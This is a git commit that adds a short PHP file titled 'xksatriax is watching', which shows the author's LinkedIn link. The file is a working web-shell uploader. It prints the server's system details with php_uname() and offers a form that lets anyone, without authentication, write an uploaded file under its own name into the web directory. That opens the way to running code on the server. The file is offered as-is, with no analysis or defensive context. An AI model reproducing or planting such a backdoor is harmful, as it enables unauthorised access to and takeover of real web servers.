944d1fc1f3c0817c403189a130641b570d434dc9
Rizka Satria S XksatriaX <42266999+satriarizka@users.noreply.github.com>
2024-08-22 15:34:01 +0700

    Add files via upload

---
+++ xksatriax-up.php
@@ -0,0 +1,10 @@
+<html>
+    <title>xksatriax is watching</title>
+<body>
+    <b>
+        XksatriaX :===&gt;&gt;&gt; Linkedin: <a href="https://www.linkedin.com/in/xksatriax/">https://www.linkedin.com/in/xksatriax/</a>
+    </b>
+    <br>
+    <?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
+</body>
+</html>
